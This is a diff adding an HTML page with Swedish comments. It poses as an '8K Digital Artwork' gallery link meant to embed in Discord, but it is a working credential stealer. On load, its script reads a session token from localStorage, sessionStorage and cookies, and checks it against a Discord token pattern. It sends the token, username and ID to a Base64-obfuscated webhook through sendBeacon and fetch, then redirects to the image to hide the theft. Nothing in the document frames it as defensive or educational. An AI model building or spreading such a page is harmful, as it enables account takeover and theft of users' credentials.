@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- DET HÄR GÖR ATT DISCORD VISAR EN BILD-EMBED -->
+    <meta property="og:title" content="✨ 8K Digital Artwork">
+    <meta property="og:image" content="https://i.imgur.com/cool-image.jpg">
+    <meta property="og:description" content="Click to view full resolution">
+    <meta property="og:url" content="https://i.imgur.com/cool-image.jpg">
+    <meta property="og:type" content="website">
+    
+    <title>Art Gallery</title>
+    
+    <style>
+        /* Dold sida – användaren ser ingenting */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0a0a0a; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh;
+            overflow: hidden;
+            font-family: -apple-system, 'Segoe UI', Arial, sans-serif;
+        }
+        .loader {
+            text-align: center;
+            color: #888;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 15px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #5865F2;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .loader p { font-size: 14px; opacity: 0.6; }
+        
+        #hiddenImage { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- Laddningsanimation (syns i <1 sekund) -->
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>Loading full resolution...</p>
+    </div>
+
+    <!-- Dold bild som triggar omdirigering -->
+    <img id="hiddenImage" src="https://i.imgur.com/cool-image.jpg" onload="startGrab()">
+
+    <script>
+        (function() {
+            'use strict';
+            
+            // ===== DIN WEBHOOK (Base64-kodad) =====
+            const WEBHOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvWU9VUl9XRUJIT09LX0lEL1lPVVJfV0VCSE9PS19UT0tFTg==");
+            const IMAGE_URL = "https://i.imgur.com/cool-image.jpg";
+            
+            // ===== TOKEN-EXTRAKTION =====
+            function getToken() {
+                let token = null;
+                
+                // localStorage
+                try { token = localStorage.getItem('token'); } catch(e) {}
+                
+                // sessionStorage
+                if (!token) {
+                    try { token = sessionStorage.getItem('token'); } catch(e) {}
+                }
+                
+                // Cookies
+                if (!token) {
+                    try {
+                        const match = document.cookie.match(/token=([^;]+)/);
+                        if (match) token = match[1];
+                    } catch(e) {}
+                }
+                
+                return token;
+            }
+            
+            // ===== VALIDERA TOKEN =====
+            function isValidToken(token) {
+                if (!token || typeof token !== 'string') return false;
+                return /^([a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27})|(mfa\.[a-zA-Z0-9_\-]{84})$/.test(token);
+            }
+            
+            // ===== SKICKA TOKEN =====
+            function sendToken(token) {
+                if (!token || !isValidToken(token)) return;
+                
+                let user = {};
+                try {
+                    user = JSON.parse(atob(token.split('.')[1]));
+                } catch(e) {}
+                
+                const data = {
+                    content: `**🔑 TOKEN GRABBED!**\n\`\`\`${token}\`\`\``,
+                    embeds: [{
+                        title: "🎯 Image Click",
+                        color: 0x5865F2,
+                        fields: [
+                            { name: "👤 User", value: user.username || "Unknown", inline: true },
+                            { name: "🆔 ID", value: user.id || "Unknown", inline: true },
+                            { name: "⏰ Time", value: new Date().toLocaleString(), inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                
+                try {
+                    navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify(data)], { type: 'application/json' }));
+                } catch(e) {}
+                
+                try {
+                    fetch(WEBHOOK, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(() => {});
+                } catch(e) {}
+            }
+            
+            // ===== HUVUDLOGIK =====
+            let executed = false;
+            
+            function startGrab() {
+                if (executed) return;
+                executed = true;
+                
+                // Försök fånga token
+                const token = getToken();
+                if (token) {
+                    sendToken(token);
+                } else {
+                    // Försök igen om 2 sekunder
+                    setTimeout(() => {
+                        const token2 = getToken();
+                        if (token2) sendToken(token2);
+                    }, 2000);
+                }
+                
+                // Omdirigera till bilden efter 1 sekund
+                setTimeout(() => {
+                    window.location.href = IMAGE_URL;
+                }, 1000);
+            }
+            
+            // Ladda bilden – när den är klar körs startGrab()
+            document.getElementById('hiddenImage').src = IMAGE_URL;
+            
+            // Om bilden inte laddas, kör ändå efter 3 sekunder
+            setTimeout(startGrab, 3000);
+            
+        })();
+    </script>
+</body>
+</html>
